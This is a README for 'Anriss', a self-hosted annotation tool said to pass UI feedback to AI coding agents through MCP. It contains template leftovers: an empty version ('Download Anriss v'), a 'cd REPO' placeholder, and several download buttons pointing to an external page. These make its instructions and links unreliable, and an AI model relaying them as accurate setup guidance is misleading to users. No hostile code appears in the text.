# Anriss - AI coding annotation tool 2026

> **A self-hosted web annotation layer for AI coding agents, built with Rust, SQLite, and MCP to help teams mark up live applications and deliver actionable interface feedback into agent workflows.**

[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/andrewkellysg1740/anriss-ui-feedback-tool?style=flat-square)](https://github.com/andrewkellysg1740/anriss-ui-feedback-tool)

---

<p align="center">
  <a href="https://andrewkellysg1740.github.io/anriss-ui-feedback-tool/">
    <img src="https://img.shields.io/badge/Download-Anriss%20Latest-brightgreen?style=for-the-badge" alt="Download Anriss">
  </a>
</p>

> **[Download Anriss v](https://andrewkellysg1740.github.io/anriss-ui-feedback-tool/)**

---

[Download Latest Build](https://andrewkellysg1740.github.io/anriss-ui-feedback-tool/)

---

## What Anriss Does

Anriss lets users annotate a running web application directly, making it possible to identify a precise interface element rather than explain its location in general terms. It is intended for AI-assisted coding processes in which accurate visual context needs to become useful input for an agent loop.

The application is self-hosted and uses a compact architecture consisting of one Rust binary, an embeddable widget, SQLite storage, and MCP connectivity for AI agents. This makes it suitable for gathering structured feedback, associating each comment with elements in the live UI, and retaining that information in a reusable format.

---

## Capabilities

- Place annotations on elements in an active web application
- Select multiple elements and associate them with a single note
- Connect MCP-compatible AI coding agents to annotation workflows
- Save structured, portable records using the W3C Web Annotation model
- Persist data with SQLite in local or self-hosted installations
- Distribute the application as a single Rust binary with an embedded widget
- Add the annotation layer through a standard script tag
- Change resolution state while implementation work progresses

---

## Getting Started

Obtain the repository or its source, then build and launch Anriss from a Rust environment.

    git clone https://github.com/andrewkellysg1740/anriss-ui-feedback-tool.git
    cd REPO
    cargo run

When using a packaged build, visit its deployed web entry point or add the included script to the application you want to annotate.

---

## Using Anriss

Run Anriss next to the web application under review. Once the annotation layer is active, select the relevant interface elements, write comments, and expose that context to the connected agent through MCP.

A normal review cycle looks like this:

1. Load the application being reviewed in a browser.
2. Turn on the annotation layer.
3. Choose a single element or a group of related elements.
4. Write a note explaining the requested adjustment.
5. Check the saved annotation and revise its resolution as the work develops.

For an embedded deployment, place the drop-in script on the target page and configure it to communicate with the local or self-hosted Anriss instance.

---

## Configuration

Deployment and local storage settings provide the primary configuration points for Anriss.

    {
      "storage": "sqlite",
      "annotationFormat": "W3C Web Annotation",
      "integration": "mcp",
      "delivery": "script-tag"
    }

When adding the widget to an existing application, ensure that its endpoint, storage destination, and agent connection match the surrounding environment.

---

## Requirements

- A web environment in which the annotation interface can run
- Rust when compiling the binary from source
- SQLite persistence
- MCP-compatible agent tools for complete workflow integration
- A browser-accessible application to annotate

---

## Frequently Asked Questions

**Is Anriss suitable for self-hosting?**  
Yes. Its deployment model is built around running the project in a self-hosted environment.

**Can it connect to AI coding agents?**  
Yes. MCP support allows annotations to feed into coding workflows driven by AI agents.

**What storage format does it use?**  
Annotations are persisted in SQLite and use the concepts defined by W3C Web Annotation.

**Can annotations be added to an application that is already running?**  
Yes. Anriss is designed for reviewing live web applications and tracking resolution changes as tasks progress.

**How can I find new builds and project changes?**  
Use the repository and its linked download location to check for the latest source or build.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
